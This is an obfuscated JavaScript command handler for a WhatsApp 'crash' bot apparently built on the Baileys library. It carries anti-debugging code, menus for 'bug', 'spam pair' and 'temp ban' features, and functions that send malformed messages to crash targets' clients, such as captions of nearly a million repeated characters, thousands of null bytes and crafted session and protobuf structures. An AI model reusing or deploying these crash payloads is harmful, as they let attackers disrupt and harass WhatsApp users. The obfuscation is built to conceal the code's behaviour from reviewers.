(function (_0x41bd29, _0x3bfd49) {
  const _0x475d17 = function () {
    let _0x13bafb = true;
    return function (_0x2018eb, _0xdaa008) {
      const _0x4e8e29 = _0x13bafb ? function () {
        if (_0xdaa008) {
          const _0x1ae4e5 = _0xdaa008.apply(_0x2018eb, arguments);
          _0xdaa008 = null;
          return _0x1ae4e5;
        }
      } : function () {};
      _0x13bafb = false;
      return _0x4e8e29;
    };
  }();
  const _0x50f689 = _0x475d17(this, function () {
    return _0x50f689.toString().search("(((.+)+)+)+$").toString().constructor(_0x50f689).search("(((.+)+)+)+$");
  });
  _0x50f689();
  const _0x223b81 = function () {
    let _0xd24793 = true;
    return function (_0x205d83, _0x2d0958) {
      const _0x285557 = _0xd24793 ? function () {
        if (_0x2d0958) {
          const _0x3bd866 = _0x2d0958.apply(_0x205d83, arguments);
          _0x2d0958 = null;
          return _0x3bd866;
        }
      } : function () {};
      _0xd24793 = false;
      return _0x285557;
    };
  }();
  const _0xbaf1a5 = _0x223b81(this, function () {
    let _0x35c754;
    try {
      const _0x5806e0 = Function("return (function() {}.constructor(\"return this\")( ));");
      _0x35c754 = _0x5806e0();
    } catch (_0x4537f3) {
      _0x35c754 = window;
    }
    const _0x7dda86 = _0x35c754.console = _0x35c754.console || {};
    const _0x565ab8 = ["log", "warn", "info", 'error', "exception", 'table', 'trace'];
    for (let _0x3dcbeb = 0; _0x3dcbeb < _0x565ab8.length; _0x3dcbeb++) {
      const _0x5e7615 = _0x223b81.constructor.prototype.bind(_0x223b81);
      const _0x88da23 = _0x565ab8[_0x3dcbeb];
      const _0x307140 = _0x7dda86[_0x88da23] || _0x5e7615;
      _0x5e7615.__proto__ = _0x223b81.bind(_0x223b81);
      _0x5e7615.toString = _0x307140.toString.bind(_0x307140);
      _0x7dda86[_0x88da23] = _0x5e7615;
    }
  });
  _0xbaf1a5();
  const _0x1813d8 = _0x41bd29();
  while (true) {
    try {
      const _0x267dcf = parseInt(_0x597c(755)) / 1 + -parseInt(_0x597c(716)) / 2 * (parseInt(_0x597c(676)) / 3) + parseInt(_0x597c(531)) / 4 + -parseInt(_0x597c(567)) / 5 * (-parseInt(_0x597c(790)) / 6) + -parseInt(_0x597c(927)) / 7 * (parseInt(_0x597c(381)) / 8) + -parseInt(_0x597c(830)) / 9 * (parseInt(_0x597c(987)) / 10) + -parseInt(_0x597c(672)) / 11 * (-parseInt(_0x597c(825)) / 12);
      if (_0x267dcf === _0x3bfd49) {
        break;
      } else {
        _0x1813d8.push(_0x1813d8.shift());
      }
    } catch (_0x37c458) {
      _0x1813d8.push(_0x1813d8.shift());
    }
  }
})(_0x3b8b, 454013);
module[_0x597c(1009)] = async (_0x5051a5, _0x432e1b, _0x3cf1fa) => {
  try {
    const _0x364b7c = _0x432e1b[_0x597c(526)][_0x597c(670)];
    const _0x27c759 = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)] : _0x432e1b;
    const _0xd4b14f = _0x432e1b[_0x597c(635)] === "conversation" ? _0x432e1b[_0x597c(598)][_0x597c(783)] : _0x432e1b[_0x597c(635)] == _0x597c(429) ? _0x432e1b[_0x597c(598)][_0x597c(429)][_0x597c(518)] : _0x432e1b[_0x597c(635)] == _0x597c(651) ? _0x432e1b[_0x597c(598)][_0x597c(651)][_0x597c(518)] : _0x432e1b[_0x597c(635)] == _0x597c(930) ? _0x432e1b[_0x597c(598)][_0x597c(930)][_0x597c(639)] : _0x432e1b[_0x597c(635)] == "buttonsResponseMessage" ? _0x432e1b.message[_0x597c(678)][_0x597c(529)] : _0x432e1b[_0x597c(635)] == _0x597c(710) ? _0x432e1b[_0x597c(598)][_0x597c(710)].singleSelectrzxReply[_0x597c(751)] : _0x432e1b[_0x597c(635)] === _0x597c(801) ? JSON[_0x597c(621)](_0x432e1b[_0x597c(598)].interactiveResponseMessage[_0x597c(682)][_0x597c(423)]).id : _0x432e1b[_0x597c(635)] == "templateButtonrzxReplyMessage" ? _0x432e1b[_0x597c(598)].templateButtonrzxReplyMessage[_0x597c(426)] : _0x432e1b[_0x597c(635)] === _0x597c(991) ? _0x432e1b[_0x597c(598)][_0x597c(678)]?.[_0x597c(529)] || _0x432e1b[_0x597c(598)][_0x597c(710)]?.["singleSelectrzxReply"][_0x597c(751)] || _0x432e1b[_0x597c(639)] : '';
    const _0x36b48b = typeof _0x432e1b[_0x597c(639)] == "string" ? _0x432e1b.text : '';
    const _0x49f20b = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/[_0x597c(654)](_0xd4b14f) ? _0xd4b14f[_0x597c(562)](/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.';
    const _0x163cfa = _0xd4b14f[_0x597c(996)](_0x49f20b);
    const _0x4af652 = _0xd4b14f[_0x597c(729)](_0x49f20b, '')[_0x597c(452)]()[_0x597c(613)](/ +/)[_0x597c(656)]().toLowerCase();
    const _0x46e001 = _0xd4b14f[_0x597c(452)]()[_0x597c(613)](/ +/)[_0x597c(697)](1);
    const _0xb9cecf = (_0x27c759[_0x597c(853)] || _0x27c759)[_0x597c(460)] || '';
    const _0x4d0552 = q = _0x46e001[_0x597c(407)](" ");
    const _0x12cc16 = _0x364b7c.endsWith(_0x597c(453));
    const _0xa4cde5 = await _0x5051a5[_0x597c(643)](_0x5051a5.user.id);
    const _0x52b5f7 = _0x432e1b[_0x597c(526)][_0x597c(938)] ? _0x5051a5[_0x597c(357)].id[_0x597c(613)](':')[0] + "@s.whatsapp.net" || _0x5051a5[_0x597c(357)].id : _0x432e1b.key[_0x597c(573)] || _0x432e1b.key[_0x597c(670)];
    const _0x23c60f = _0x52b5f7[_0x597c(613)]('@')[0];
    const _0x5669af = _0x432e1b[_0x597c(596)] || '' + _0x23c60f;
    const _0x407bc1 = _0x12cc16 ? await _0x5051a5[_0x597c(855)](_0x432e1b[_0x597c(805)])["catch"](_0x2c4d37 => {}) : '';
    const _0x3aa99c = _0x12cc16 ? await _0x407bc1[_0x597c(745)] : '';
    const _0x9bd7d0 = _0x12cc16 ? await _0x3aa99c[_0x597c(998)](_0x405a18 => _0x405a18.admin !== null)[_0x597c(541)](_0x81f6c3 => _0x81f6c3.id) : '';
    const _0x3cba2a = _0x12cc16 ? _0x407bc1[_0x597c(745)] : '';
    const _0x1814f3 = _0x12cc16 ? _0x9bd7d0[_0x597c(402)](_0xa4cde5) : false;
    const _0x35d515 = _0x12cc16 ? _0x9bd7d0[_0x597c(402)](_0x52b5f7) : false;
    const {
      Client: _0x4b5e91
    } = require('ssh2');
    const {
      remini: _0x277fe1
    } = require("./all/remini");
    const _0x28069b = require(_0x597c(843));
    const {
      addSaldo: _0x51841c,
      minSaldo: _0x2f5bc1,
      cekSaldo: _0x41bbf0
    } = require(_0x597c(962));
    const {
      beta1: _0x32efae,
      beta2: _0x4b010a,
      buk1: _0x1fe716
    } = require("./all/database/hdr.js");
    if (_0x432e1b.sender[_0x597c(996)](_0x597c(539))) {
      return _0x5051a5[_0x597c(516)](_0x432e1b[_0x597c(467)], _0x597c(923));
    }
    const _0x250d1f = [_0x597c(436), _0x597c(385), _0x597c(542), _0x597c(437), _0x597c(597), _0x597c(844), _0x597c(463)];
    const _0x4d4144 = _0x250d1f[Math[_0x597c(582)](Math[_0x597c(862)]() * _0x250d1f[_0x597c(625)])];
    if (_0x163cfa) {
      console[_0x597c(949)](chalk.yellow[_0x597c(489)][_0x597c(924)](namabot), color(_0x597c(671), '' + _0x4d4144), color("FROM", '' + _0x4d4144), color('' + _0x5669af, '' + _0x4d4144), color(_0x597c(683), '' + _0x4d4144), color('' + _0xd4b14f, _0x597c(463)));
    }
    const _0x54173e = moment().tz(_0x597c(713))[_0x597c(570)]('HH:mm:ss');
    if (_0x54173e < _0x597c(577)) {
      var _0x5ea8dc = _0x597c(961);
    }
    if (_0x54173e < _0x597c(637)) {
      var _0x5ea8dc = _0x597c(513);
    }
    if (_0x54173e < '18:00:00') {
      var _0x5ea8dc = "Selamat Sore 🌇";
    }
    if (_0x54173e < _0x597c(914)) {
      var _0x5ea8dc = _0x597c(747);
    }
    if (_0x54173e < _0x597c(699)) {
      var _0x5ea8dc = _0x597c(477);
    }
    if (_0x54173e < _0x597c(524)) {
      var _0x5ea8dc = _0x597c(884);
    }
    if (_0x54173e < _0x597c(421)) {
      var _0x5ea8dc = _0x597c(932);
    }
    const _0x46c237 = JSON.parse(fs[_0x597c(481)](_0x597c(890)));
    const _0x255cb7 = JSON.parse(fs[_0x597c(481)](_0x597c(1013)));
    const _0x403967 = _0x46c237[_0x597c(402)](_0x52b5f7);
    const _0x18271c = _0x255cb7[_0x597c(402)](_0x23c60f);
    let _0x1d9e17 = [];
    for (let _0x2edbcd of _0x255cb7) {
      _0x1d9e17[_0x597c(980)]({
        'displayName': await _0x5051a5[_0x597c(965)](_0x2edbcd + _0x597c(981)),
        'vcard': _0x597c(701) + (await _0x5051a5[_0x597c(965)](_0x2edbcd + _0x597c(981))) + _0x597c(928) + (await _0x5051a5[_0x597c(965)](_0x2edbcd + _0x597c(981))) + "\n\nitem1.TEL;waid=" + _0x2edbcd + ':' + _0x2edbcd + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET:rzx@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:https://chat.whatsapp.com/Bn3tcvTGopCHirKLd2Us9z\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;Indonesia;;;;\n\nitem4.X-ABLabel:Region\n\nEND:VCARD"
      });
    }
    try {
      ppuser = await _0x5051a5[_0x597c(811)](_0x432e1b.sender, _0x597c(430));
    } catch (_0x4311a9) {
      ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    async function _0x108d28(_0x536aeb) {
      return new Promise((_0x4876f0, _0x112489) => {
        try {
          const _0x5d803b = {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 0x1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 0x1
          };
          const _0x573a9c = _0x28069b.obfuscate(_0x536aeb, _0x5d803b);
          const _0x554087 = {
            'status': 0x7d0,
            'author': 'rzx',
            'result': _0x573a9c[_0x597c(686)]()
          };
          _0x4876f0(_0x554087);
        } catch (_0x3cb8a1) {
          _0x112489(_0x3cb8a1);
        }
      });
    }
    async function _0x23f122(_0x7f40a8, _0x4b0885) {
      var _0x55b17e = generateWAMessageFromContent(_0x7f40a8, proto[_0x597c(414)][_0x597c(808)]({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'x',
              'degreesLongitude': 'x',
              'caption': _0x597c(942) + _0x597c(889),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x7f40a8,
        'quoted': _0x4b0885
      });
      await _0x5051a5[_0x597c(373)](_0x7f40a8, _0x55b17e[_0x597c(598)], {
        'messageId': _0x55b17e[_0x597c(526)].id
      });
    }
    async function _0x19508d(_0x4224d5, _0x144bc4, _0x54f462, _0x2bfa07, _0x3fda7d, _0x308302, _0x4213bb, _0x2cc182, _0x1b7584, _0x54b32b, _0x29c4a4, _0x4c4027, _0x2ab7e1, _0x53b01d) {
      const _0x3afc58 = {
        sessionVersion: _0x144bc4,
        localIdentityPublic: _0x54f462,
        remoteIdentityPublic: _0x2bfa07,
        rootKey: _0x3fda7d,
        previousCounter: _0x308302,
        senderChain: _0x4213bb,
        receiverChains: _0x2cc182,
        pendingKeyExchange: _0x1b7584,
        pendingPreKey: _0x54b32b,
        remoteRegistrationId: _0x29c4a4,
        localRegistrationId: _0x4c4027,
        needsRefresh: _0x2ab7e1,
        aliceBaseKey: _0x53b01d
      };
      const _0x34203b = {
        sessionStructure: _0x3afc58
      };
      var _0x256a95 = generateWAMessageFromContent(_0x4224d5, proto[_0x597c(414)][_0x597c(808)](_0x34203b), {
        'userJid': _0x4224d5
      });
      await _0x5051a5[_0x597c(373)](_0x4224d5, _0x256a95[_0x597c(598)], {
        'participant': {
          'jid': _0x4224d5
        },
        'messageId': _0x256a95.key.id
      });
    }
    const _0xcba78f = {
      'key': {
        'participant': _0x597c(775),
        ...(_0x432e1b[_0x597c(805)] ? {
          'remoteJid': _0x597c(347)
        } : {})
      },
      'message': {
        'interactiveMessage': {
          'header': {
            'hasMediaAttachment': true,
            'jpegThumbnail': fs[_0x597c(481)](_0x597c(615))
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': "review_and_pay",
              'buttonParamsJson': _0x597c(1003)
            }]
          }
        }
      }
    };
    async function _0x2f2312(_0x4ae169, _0x394650) {
      var _0xdfc697 = generateWAMessageFromContent(_0x4ae169, proto[_0x597c(414)][_0x597c(808)]({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': _0x597c(380) + 'ꦾ'.repeat(999999),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x4ae169,
        'quoted': _0x394650
      });
      await _0x5051a5[_0x597c(373)](_0x4ae169, _0xdfc697.message, {
        'participant': {
          'jid': _0x4ae169
        },
        'messageId': _0xdfc697[_0x597c(526)].id
      });
    }
    async function _0x5e61a6(_0x13ac35, _0x293623, _0x2255c0, _0x533165, _0x26fed0, _0x172d6b, _0x371297, _0x32cfc0) {
      const _0x27fd29 = {
        filterName: _0x293623,
        parameters: _0x2255c0,
        filterResult: _0x533165,
        clientNotSupportedConfig: _0x26fed0
      };
      const _0x25129d = {
        clauseType: _0x172d6b,
        clauses: _0x371297,
        filters: _0x32cfc0
      };
      const _0x311271 = {
        filter: _0x27fd29,
        filterClause: _0x25129d
      };
      const _0x4e5160 = {
        'qp': _0x311271
      };
      var _0x520000 = generateWAMessageFromContent(_0x13ac35, proto[_0x597c(414)][_0x597c(808)](_0x4e5160), {
        'userJid': _0x13ac35
      });
      await _0x5051a5[_0x597c(373)](_0x13ac35, _0x520000[_0x597c(598)], {
        'participant': {
          'jid': _0x13ac35
        },
        'messageId': _0x520000[_0x597c(526)].id
      });
    }
    async function _0x162062(_0x448fd3) {
      const _0x449c9a = {
        title: '',
        subtitle: " "
      };
      const _0xbcef80 = {
        text: 'xp'
      };
      var _0x3bc7b4 = generateWAMessageFromContent(_0x448fd3, proto[_0x597c(414)][_0x597c(808)]({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': _0x449c9a,
              'body': {
                'text': _0x597c(909)
              },
              'footer': _0xbcef80,
              'nativeFlowMessage': {
                'buttons': [{
                  'name': _0x597c(439),
                  'buttonParamsJson': "{ display_text : '𝐑𝐈𝐙𝐗𝐙 𝐌𝐎𝐃𝐒 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏', url : , merchant_url :  }"
                }],
                'messageParamsJson': "\0"[_0x597c(789)](4240)
              }
            }
          }
        }
      }), {
        'userJid': _0x448fd3
      });
      await _0x5051a5[_0x597c(373)](_0x448fd3, _0x3bc7b4[_0x597c(598)], {
        'participant': {
          'jid': _0x448fd3
        },
        'messageId': _0x3bc7b4[_0x597c(526)].id
      });
    }
    async function _0x32fe63() {
      var _0x85d355 = ['𝐑', _0x597c(763), _0x597c(653), _0x597c(1004), "𝐑𝐈𝐙𝐗𝐙", _0x597c(770)];
      let {
        key: _0x1fd53b
      } = await _0x5051a5.sendMessage(_0x432e1b[_0x597c(805)], {
        'text': _0x597c(379)
      });
      for (let _0x4c69da = 0; _0x4c69da < _0x85d355[_0x597c(625)]; _0x4c69da++) {
        const _0xc227f8 = {
          text: _0x85d355[_0x4c69da],
          edit: _0x1fd53b
        };
        await sleep(10);
        await _0x5051a5.sendMessage(_0x432e1b[_0x597c(805)], _0xc227f8);
      }
    }
    const _0x3652ad = _0x5bb8cd => {
      _0x5051a5.sendMessage(_0x432e1b.chat, {
        'text': _0x5bb8cd,
        'contextInfo': {
          'mentionedJid': [_0x52b5f7],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdrzxReply': {
            'showAdAttribution': true,
            'containsAutorzxReply': true,
            'title': _0x597c(936),
            'body': '' + namabot,
            'previewType': _0x597c(778),
            'thumbnailUrl': '',
            'thumbnail': fs[_0x597c(481)]("./Media/Menu.jpg"),
            'sourceUrl': '' + isLink
          }
        }
      }, {
        'quoted': _0x432e1b
      });
    };
    if (_0x432e1b[_0x597c(1007)] && !_0x432e1b[_0x597c(526)][_0x597c(938)] && !_0x18271c && antilink) {
      if (!_0x1814f3) {
        return;
      }
      if (_0x36b48b[_0x597c(562)](_0x597c(575))) {
        _0x5051a5[_0x597c(937)](_0x432e1b.chat, {
          'text': "*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group " + _0x407bc1[_0x597c(993)]
        }, {
          'quoted': _0x432e1b
        });
        _0x5051a5[_0x597c(834)](_0x432e1b[_0x597c(805)], [_0x52b5f7], _0x597c(761));
        _0x5051a5[_0x597c(937)](_0x432e1b[_0x597c(805)], {
          'delete': _0x432e1b[_0x597c(526)]
        });
      }
    }
    switch (_0x4af652) {
      case _0x597c(872):
      case "help":
        {
          await _0x32fe63();
          const _0x545dba = {
            deviceListMetadata: {},
            deviceListMetadataVersion: 0x2
          };
          const _0xc78c45 = {
            showAdAttribution: true
          };
          const _0x8cb709 = {
            'text': ''
          };
          let _0x1f5760 = "╭──(        🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇ཀ͜͡🐉         )\n║- 𝐒𝐜 𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇 𝑪͢𝒓𝒂ͯ͢𝒔𝒉友\n│🎭 ɴᴀᴍᴇ : " + _0x432e1b.pushName + _0x597c(718) + owner[_0x597c(613)]('@')[0] + _0x597c(530) + runtime(process[_0x597c(1002)]()) + _0x597c(874);
          let _0x1b6871 = [{
            'title': _0x597c(636),
            'highlight_label': _0x597c(657),
            'rows': [{
              'title': _0x597c(835),
              'id': _0x597c(732)
            }]
          }, {
            'title': _0x597c(861),
            'highlight_label': "𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖〽️",
            'rows': [{
              'title': _0x597c(660),
              'id': _0x597c(566)
            }]
          }, {
            'highlight_label': _0x597c(441),
            'rows': [{
              'title': _0x597c(709),
              'id': _0x597c(440)
            }]
          }, {
            'highlight_label': "𝑰𝒏𝒔𝒕𝒂𝒍𝒍 𝑴𝒆𝒏𝒖〽️",
            'rows': [{
              'title': _0x597c(482),
              'id': _0x597c(859)
            }]
          }, {
            'title': "⿻  ⌜ 𝐑𝐳𝐱𝐕𝐯𝐢𝐩 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻",
            'highlight_label': _0x597c(827),
            'rows': [{
              'title': _0x597c(943),
              'id': '.spampair'
            }]
          }, {
            'highlight_label': _0x597c(493),
            'rows': [{
              'title': "🩸⃟༑⌁⃰ T̥ͦe̥ͦm̥ͦp̥ͦ  B̥ͦḁͦn̥ͦd ཀ͜͡🐉",
              'id': _0x597c(721)
            }]
          }];
          let _0x34613a = {
            'title': _0x597c(364),
            'sections': _0x1b6871
          };
          let _0x5dd999 = generateWAMessageFromContent(_0x432e1b[_0x597c(805)], {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': _0x545dba,
                'interactiveMessage': proto[_0x597c(414)][_0x597c(367)][_0x597c(419)]({
                  'contextInfo': {
                    'mentionedJid': [_0x432e1b.sender],
                    'externalAdrzxReply': _0xc78c45
                  },
                  'body': proto[_0x597c(414)].InteractiveMessage[_0x597c(400)][_0x597c(419)]({
                    'text': _0x1f5760
                  }),
                  'footer': proto[_0x597c(414)][_0x597c(367)][_0x597c(475)][_0x597c(419)](_0x8cb709),
                  'header': proto.Message[_0x597c(367)].Header.create({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs[_0x597c(481)](_0x597c(615))
                    }, {
                      'upload': _0x5051a5[_0x597c(479)]
                    }))
                  }),
                  'nativeFlowMessage': proto[_0x597c(414)].InteractiveMessage[_0x597c(891)][_0x597c(419)]({
                    'buttons': [{
                      'name': "single_select",
                      'buttonParamsJson': JSON[_0x597c(554)](_0x34613a)
                    }, {
                      'name': _0x597c(439),
                      'buttonParamsJson': _0x597c(822)
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x432e1b.sender,
            'quoted': _0x432e1b
          });
          await _0x5051a5[_0x597c(373)](_0x5dd999[_0x597c(526)][_0x597c(670)], _0x5dd999[_0x597c(598)], {
            'messageId': _0x5dd999[_0x597c(526)].id
          });
        }
        break;
      case _0x597c(912):
      case _0x597c(561):
        {
          await _0x32fe63();
          const _0x523811 = {
            deviceListMetadata: {},
            deviceListMetadataVersion: 0x2
          };
          const _0x152703 = {
            showAdAttribution: true
          };
          const _0x1449a8 = {
            text: ''
          };
          let _0xeea472 = _0x597c(501) + _0x432e1b.pushName + _0x597c(718) + owner[_0x597c(613)]('@')[0] + _0x597c(530) + runtime(process.uptime()) + _0x597c(388);
          let _0x1a41e4 = [{
            'title': _0x597c(636),
            'highlight_label': _0x597c(657),
            'rows': [{
              'title': _0x597c(835),
              'id': _0x597c(732)
            }]
          }, {
            'title': "⿻  ⌜ 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻",
            'highlight_label': _0x597c(681),
            'rows': [{
              'title': _0x597c(660),
              'id': _0x597c(566)
            }]
          }, {
            'highlight_label': _0x597c(441),
            'rows': [{
              'title': "🩸⃟༑⌁⃰B̥ͦu̥ͦg̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉",
              'id': _0x597c(440)
            }]
          }, {
            'highlight_label': "𝑰𝒏𝒔𝒕𝒂𝒍𝒍 𝑴𝒆𝒏𝒖〽️",
            'rows': [{
              'title': "🩸⃟༑⌁⃰I̥ͦn̥ͦs̥ͦt̥ͦḁͦl̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉",
              'id': _0x597c(859)
            }]
          }, {
            'title': _0x597c(972),
            'highlight_label': _0x597c(827),
            'rows': [{
              'title': _0x597c(943),
              'id': _0x597c(702)
            }]
          }, {
            'highlight_label': "𝐓𝐞𝐦𝐩 𝐁𝐚𝐧𝐝〽️",
            'rows': [{
              'title': "🩸⃟༑⌁⃰ T̥ͦe̥ͦm̥ͦp̥ͦ  B̥ͦḁͦn̥ͦd ཀ͜͡🐉",
              'id': _0x597c(721)
            }]
          }];
          let _0x365a09 = {
            'title': _0x597c(364),
            'sections': _0x1a41e4
          };
          let _0x41352f = generateWAMessageFromContent(_0x432e1b.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': _0x523811,
                'interactiveMessage': proto[_0x597c(414)][_0x597c(367)][_0x597c(419)]({
                  'contextInfo': {
                    'mentionedJid': [_0x432e1b[_0x597c(467)]],
                    'externalAdrzxReply': _0x152703
                  },
                  'body': proto[_0x597c(414)].InteractiveMessage.Body[_0x597c(419)]({
                    'text': _0xeea472
                  }),
                  'footer': proto[_0x597c(414)].InteractiveMessage[_0x597c(475)][_0x597c(419)](_0x1449a8),
                  'header': proto[_0x597c(414)][_0x597c(367)].Header[_0x597c(419)]({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs[_0x597c(481)]("./Media/Menu.jpg")
                    }, {
                      'upload': _0x5051a5[_0x597c(479)]
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage[_0x597c(891)][_0x597c(419)]({
                    'buttons': [{
                      'name': _0x597c(447),
                      'buttonParamsJson': JSON[_0x597c(554)](_0x365a09)
                    }, {
                      'name': _0x597c(439),
                      'buttonParamsJson': _0x597c(822)
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x432e1b[_0x597c(467)],
            'quoted': _0x432e1b
          });
          await _0x5051a5[_0x597c(373)](_0x41352f[_0x597c(526)][_0x597c(670)], _0x41352f[_0x597c(598)], {
            'messageId': _0x41352f[_0x597c(526)].id
          });
        }
        break;
      case "toolsmenu":
        {
          await _0x32fe63();
          const _0x19dded = {
            deviceListMetadata: {},
            deviceListMetadataVersion: 0x2
          };
          const _0x360372 = {
            showAdAttribution: true
          };
          const _0x140988 = {
            text: ''
          };
          let _0x111e0c = "╭──(        🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇ཀ͜͡🐉        )\n║- 𝐒𝐜 𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇 𝑪͢𝒓𝒂ͯ͢𝒔𝒉友\n│🎭 ɴᴀᴍᴇ : " + _0x432e1b[_0x597c(596)] + _0x597c(718) + owner[_0x597c(613)]('@')[0] + _0x597c(530) + runtime(process[_0x597c(1002)]()) + _0x597c(512);
          let _0x3b2ede = [{
            'title': _0x597c(636),
            'highlight_label': _0x597c(657),
            'rows': [{
              'title': _0x597c(835),
              'id': _0x597c(732)
            }]
          }, {
            'title': _0x597c(861),
            'highlight_label': _0x597c(681),
            'rows': [{
              'title': _0x597c(660),
              'id': _0x597c(566)
            }]
          }, {
            'highlight_label': "𝑩𝒖𝒈 𝑴𝒆𝒏𝒖〽️",
            'rows': [{
              'title': _0x597c(709),
              'id': _0x597c(440)
            }]
          }, {
            'highlight_label': _0x597c(714),
            'rows': [{
              'title': _0x597c(482),
              'id': _0x597c(859)
            }]
          }, {
            'title': _0x597c(972),
            'highlight_label': _0x597c(827),
            'rows': [{
              'title': "🩸⃟༑⌁⃰ Ŝ̬p̬̂â̬m̬̂  P̬̂â̬î̬r̬̂ ཀ͜͡🐉",
              'id': _0x597c(702)
            }]
          }, {
            'highlight_label': _0x597c(493),
            'rows': [{
              'title': _0x597c(431),
              'id': _0x597c(721)
            }]
          }];
          let _0x14bc89 = {
            'title': "⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓🐉 ⌟",
            'sections': _0x3b2ede
          };
          let _0x455fd9 = generateWAMessageFromContent(_0x432e1b.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': _0x19dded,
                'interactiveMessage': proto.Message[_0x597c(367)].create({
                  'contextInfo': {
                    'mentionedJid': [_0x432e1b.sender],
                    'externalAdrzxReply': _0x360372
                  },
                  'body': proto[_0x597c(414)][_0x597c(367)][_0x597c(400)].create({
                    'text': _0x111e0c
                  }),
                  'footer': proto[_0x597c(414)][_0x597c(367)][_0x597c(475)][_0x597c(419)](_0x140988),
                  'header': proto[_0x597c(414)].InteractiveMessage.Header[_0x597c(419)]({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs[_0x597c(481)](_0x597c(615))
                    }, {
                      'upload': _0x5051a5[_0x597c(479)]
                    }))
                  }),
                  'nativeFlowMessage': proto[_0x597c(414)][_0x597c(367)].NativeFlowMessage[_0x597c(419)]({
                    'buttons': [{
                      'name': _0x597c(447),
                      'buttonParamsJson': JSON[_0x597c(554)](_0x14bc89)
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': _0x597c(822)
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x432e1b[_0x597c(467)],
            'quoted': _0x432e1b
          });
          await _0x5051a5.relayMessage(_0x455fd9[_0x597c(526)][_0x597c(670)], _0x455fd9[_0x597c(598)], {
            'messageId': _0x455fd9[_0x597c(526)].id
          });
        }
        break;
      case "installpanelmenu":
        {
          await _0x32fe63();
          const _0x1609a1 = {
            deviceListMetadata: {},
            deviceListMetadataVersion: 0x2
          };
          const _0x37b9d0 = {
            showAdAttribution: true
          };
          const _0x1e6b18 = {
            text: ''
          };
          let _0x273541 = _0x597c(501) + _0x432e1b[_0x597c(596)] + "\n║▬▭▬▭▬▭▬▭▬▭\n│🎭 ᴄʀᴇᴀᴛᴏʀ :  𝐑𝐢𝐳𝐱𝐳𝐖𝐚𝐧𝐠𝐬𝐚𝐟𝐟\n║🎭 ɴᴏ ᴄʀᴇᴀᴛᴏʀ : @" + owner[_0x597c(613)]('@')[0] + _0x597c(530) + runtime(process.uptime()) + _0x597c(478);
          let _0x1165bc = [{
            'title': _0x597c(636),
            'highlight_label': _0x597c(657),
            'rows': [{
              'title': "🩸⃟༑⌁⃰ 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 ཀ͜͡🐉",
              'id': _0x597c(732)
            }]
          }, {
            'title': _0x597c(861),
            'highlight_label': _0x597c(681),
            'rows': [{
              'title': _0x597c(660),
              'id': '.toolsmenu'
            }]
          }, {
            'highlight_label': _0x597c(441),
            'rows': [{
              'title': "🩸⃟༑⌁⃰B̥ͦu̥ͦg̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉",
              'id': ".bugmenu"
            }]
          }, {
            'highlight_label': _0x597c(714),
            'rows': [{
              'title': _0x597c(482),
              'id': _0x597c(859)
            }]
          }, {
            'title': "⿻  ⌜ 𝐑𝐳𝐱𝐕𝐯𝐢𝐩 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻",
            'highlight_label': _0x597c(827),
            'rows': [{
              'title': _0x597c(943),
              'id': _0x597c(702)
            }]
          }, {
            'highlight_label': "𝐓𝐞𝐦𝐩 𝐁𝐚𝐧𝐝〽️",
            'rows': [{
              'title': _0x597c(431),
